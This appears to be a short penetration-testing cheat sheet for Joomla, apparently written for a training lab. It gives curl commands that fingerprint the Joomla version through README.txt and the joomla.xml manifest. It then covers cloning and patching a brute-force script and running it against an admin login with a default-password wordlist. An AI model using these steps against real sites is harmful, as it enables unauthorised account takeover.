# Version

Either

```sh
curl -s "http://$target/README.txt"
```

or

```sh
curl -s "http://$target/administrator/manifests/files/joomla.xml" | xmllint --format -
```

# Login bruteforce

Install

```sh
git clone https://github.com/ajnik/joomla-bruteforce.git
cd joomla-bruteforce
# Replace the open(file, 'rb+') mode to rb. No need for write permission when we only read the wordlist
cat joomla-brute.py | sed -i 's/rb+/rb/g' joomla-brute.py
```

Do it

```sh
./joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```
